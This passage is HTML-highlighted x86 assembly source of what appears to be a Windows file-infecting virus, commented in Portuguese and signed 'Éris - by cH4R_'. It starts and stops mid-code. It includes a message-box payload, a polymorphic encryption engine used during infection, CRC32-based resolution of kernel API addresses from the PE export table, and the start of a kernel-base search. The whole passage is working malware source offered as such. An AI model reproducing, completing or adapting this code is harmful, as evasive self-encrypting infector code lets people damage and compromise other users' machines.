</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">     </span><span class="sc1">; Fechar arquivo...</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@user32</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"USER32"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@user32</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; USER32.DLL</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">LoadLibraryA</span><span class="sc0">     </span><span class="sc1">; carrega...</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; Salva eax !</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@msgbox</span><span class="sc0">        </span><span class="sc1">; "MessageBoxA"</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"MessageBoxA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@msgbox</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; Handle</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">   </span><span class="sc1">; pega endereço...</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">; EBX = 0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">                   </span><span class="sc1">; MB_ICONERROR</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@title</span><span class="sc0">               </span><span class="sc1">; titulo</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Éris - by cH4R_"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@title</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@text</span><span class="sc0">                </span><span class="sc1">; texto</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">22h</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">" Nada é verdadeiro,"</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">" tudo é permitido. "</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">22h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@text</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                   </span><span class="sc1">; hWnd</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; MessageBoxA</span><span class="sc0">

</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">FreeLibrary</span><span class="sc0">  </span><span class="sc1">; Descarrega DLL</span><span class="sc0">

</span><span class="sc5">payload_fim</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">              </span><span class="sc1">; Retorna...</span><span class="sc0">

</span><span class="sc5">rnd_ch</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc0">         </span><span class="sc1">; 28 possibilidades</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">       </span><span class="sc1">; ASCII - de "@" a "["</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Payload</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;  Função que coordena o polimorfismo e a criptografia na infecção</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Entrada:</span><span class="sc0">
</span><span class="sc1">; EAX = Area do arquivo mapeado onde os codigos de criptografia entrarão</span><span class="sc0">

</span><span class="sc5">Crypt_Poly</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">                     </span><span class="sc1">; Salva registradores...</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; Salva EAX</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Cria_Genotipo</span><span class="sc0">         </span><span class="sc1">; Cria um genótipo de polimorfismo</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; Recupera EAX</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Cria_Fenotipo</span><span class="sc0">         </span><span class="sc1">; Gera um fenótipo baseado no genótipo, obvio...</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                   </span><span class="sc1">; Salva EDI</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">n_Comp</span><span class="sc0">             </span><span class="sc1">; ECX = Tamanho do decriptador complexo</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                   </span><span class="sc1">; Salva ECX</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DeCrypt</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc1">; ESI = Inicio do decriptador complexo</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">                        </span><span class="sc1">; Direção de ESI</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                  </span><span class="sc1">; Copia...</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">; Recupera ECX</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                    </span><span class="sc1">; Recupera EDI em ESI</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; EAX = [ESI-5]</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                 </span><span class="sc1">; AL = 4 ?</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@ok</span><span class="sc0">                   </span><span class="sc1">; Senão pode pular esta parte...</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Se é, então lê um pouco mais...</span><span class="sc0">
</span><span class="sc5">@@ok</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@sub</span><span class="sc0">                   </span><span class="sc1">; É ADD ? Poe SUB</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@sbb</span><span class="sc0">                   </span><span class="sc1">; É ADC ? Poe SBB</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@adc</span><span class="sc0">                   </span><span class="sc1">; É SBB ? Poe ADC</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@add</span><span class="sc0">                   </span><span class="sc1">; É SUB ? Poe ADD</span><span class="sc0">

</span><span class="sc5">@@xor</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; Se não foi nada, então é xor.</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                 </span><span class="sc1">; Deixa como xor mesmo...</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@wr_enc</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@@sub</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; Muda pra SUB</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@wr_enc</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@@sbb</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; Muda pra SBB</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">018h</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@wr_enc</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@@adc</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; Muda pra ADC</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@wr_enc</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@@add</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; Muda pra ADD</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@@wr_enc</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">bye</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">e_instruc</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">  </span><span class="sc1">; Altera instrução</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">; Troca EAX com EDX</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">bye</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">e_mod2</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">     </span><span class="sc1">; Poe um modificador</span><span class="sc0">
</span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                         </span><span class="sc1">; Tem AAA ?</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">poe_nop</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">bye</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">e_mod1</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc2">037h</span><span class="sc0">   </span><span class="sc1">; opcode de AAA</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">rcX_def</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">poe_nop</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">bye</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">e_mod1</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc2">090h</span><span class="sc0">   </span><span class="sc1">; opcode de NOP</span><span class="sc0">
</span><span class="sc5">rcX_def</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                         </span><span class="sc1">; RCL ou RCR ?</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">poe_rcl</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">bye</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">e_rcX</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc2">0D8h</span><span class="sc0">    </span><span class="sc1">; opcode de RCR</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">enc_loop</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">poe_rcl</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">bye</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">e_rcX</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc2">0D0h</span><span class="sc0">    </span><span class="sc1">; opcode de RCL</span><span class="sc0">

</span><span class="sc5">enc_loop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">                         </span><span class="sc1">; nop ou aaa</span><span class="sc0">
</span><span class="sc5">e_mod1</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; xor edx,ecx</span><span class="sc0">
</span><span class="sc5">e_rcX</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">                </span><span class="sc1">; rcl/rcr edx,modificador</span><span class="sc0">
</span><span class="sc5">e_mod2</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc5">bye</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; xor [codigo],chave</span><span class="sc0">
</span><span class="sc5">e_instruc</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">enc_loop</span><span class="sc0">               </span><span class="sc1">; loop ;)</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">               </span><span class="sc1">; Recupera regs...</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">; Retorna...</span><span class="sc0">

</span><span class="sc5">Crypt_Poly</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;        Função que procura uma API na kernel pelo CRC32</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Entrada: EAX = CRC32 da API</span><span class="sc0">
</span><span class="sc1">; Saida: EAX = Endereço da API</span><span class="sc0">


</span><span class="sc5">AchaAPI</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">               </span><span class="sc1">; Salva todos os registradores</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; EBX = EAX</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; EAX = 0</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ESI = Endereço da kernel</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">          </span><span class="sc1">; EDI = Endereço da kernel</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; ESI = Cabeçalho PE</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Export directory</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">          </span><span class="sc1">; Normaliza</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc5">.ED_AddressOfFunctions</span><span class="sc0"> </span><span class="sc1">; Endereço da tabela de RVA das funções</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">; Salva na stack</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc5">.ED_AddressOfOrdinals</span><span class="sc0">  </span><span class="sc1">; Endereço da tabela de ordinais</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">; Salva na stack</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc5">.ED_AddressOfNames</span><span class="sc0">     </span><span class="sc1">; Endereço da tabela de nomes</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; Normaliza</span><span class="sc0">

</span><span class="sc6">cdq</span><span class="sc0">                    </span><span class="sc1">; Zera contador (EDX)</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">; EDX --</span><span class="sc0">

</span><span class="sc5">compara</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">                  </span><span class="sc1">; Carrega ESI em EAX</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">; Incrementa contador...</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">                 </span><span class="sc1">; Salva registradores...</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">            </span><span class="sc1">; EDI = 0</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Normaliza EAX</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; Troca EAX com EDI</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">            </span><span class="sc1">; ECX = EDI (Ponteiro para o nome da API)</span><span class="sc0">
</span><span class="sc5">tamanho</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">scasb</span><span class="sc0">                  </span><span class="sc1">; (AL = [EDI]) Eh zero ?</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">tamanho</span><span class="sc0">            </span><span class="sc1">; Se não continua..</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">            </span><span class="sc1">; EDI = EDI - ECX</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">; EDI--</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">               </span><span class="sc1">; Arg1 (tamanho da string)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">               </span><span class="sc1">; Arg2 (ponteiro para o código)</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0">             </span><span class="sc1">; Calcula CRC32</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">            </span><span class="sc1">; EBX = EAX ?</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">                  </span><span class="sc1">; Volta com registradores salvos</span><span class="sc0">

</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">achou_api</span><span class="sc0">           </span><span class="sc1">; Se achou pula pra fora daqui</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">compara</span><span class="sc0">            </span><span class="sc1">; Senão achou continua na rotina...</span><span class="sc0">

</span><span class="sc5">achou_api</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc1">; EAX = Kernel base</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">              </span><span class="sc1">; EAX = Contador &amp; EDX = Kernel base</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                   </span><span class="sc1">; ESI = Address Of Ordinals</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">               </span><span class="sc1">; Normaliza</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                 </span><span class="sc1">; EAX = EAX * 2</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">               </span><span class="sc1">; EAX = Endereço do ordinal da API</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">               </span><span class="sc1">; ECX = 0</span><span class="sc0">
</span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">wod</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; ECX = Ordinal da API</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                   </span><span class="sc1">; EDI = Address of Functions</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                 </span><span class="sc1">; ECX = ECX * 4</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">               </span><span class="sc1">; Normaliza</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">               </span><span class="sc1">; ECX = Ponteiro para o endereço da API</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; EAX = Endereço da API</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">               </span><span class="sc1">; Normaliza</span><span class="sc0">

</span><span class="sc5">achaapi_fim</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK_REG._EAX</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; EAX na stack = EAX</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">                        </span><span class="sc1">; Recupera todos os registradores</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                          </span><span class="sc1">; Retorna...</span><span class="sc0">

</span><span class="sc5">AchaAPI</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;    Lê tabela de kernels, manda checar e retorna kernel base</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Saida:</span><span class="sc0">
</span><span class="sc1">; EBX = Endereço da kernel</span><span class="sc0">
</span><span class="sc1">; EAX = Boolean (0 = ok, &lt;&gt;0 = erro)</span><span class="sc0">

</span><span class="sc5">ProcuraKrn</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                   </span><span class="sc1">; Numero de endereços</span><span class="sc0">
